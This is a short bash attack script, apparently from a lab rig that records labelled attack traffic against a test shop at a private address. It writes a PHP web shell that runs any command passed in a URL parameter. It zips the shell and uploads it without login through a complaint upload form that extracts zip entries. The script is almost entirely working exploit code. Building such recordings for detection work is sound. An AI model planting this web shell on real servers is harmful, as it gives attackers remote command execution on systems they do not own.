#!/usr/bin/env bash
# ATK-13 variant a: plants a file through the complaint upload. Only a .zip's entries are written to
# uploads/complaints/, so the file goes in a zip. It's a PHP web shell: inert on a Node shop, but a
# classic marker of compromise. No login needed. curl's own user agent (loud).
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: loud: zipped PHP web shell through /file-upload, curl user agent
set -eu
cd /tmp
printf '%s\n' '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > rip.php
zip -q complaint.zip rip.php
curl -s -X POST http://10.66.0.10/file-upload -F 'file=@complaint.zip;type=application/zip' -w '%{http_code}\n'
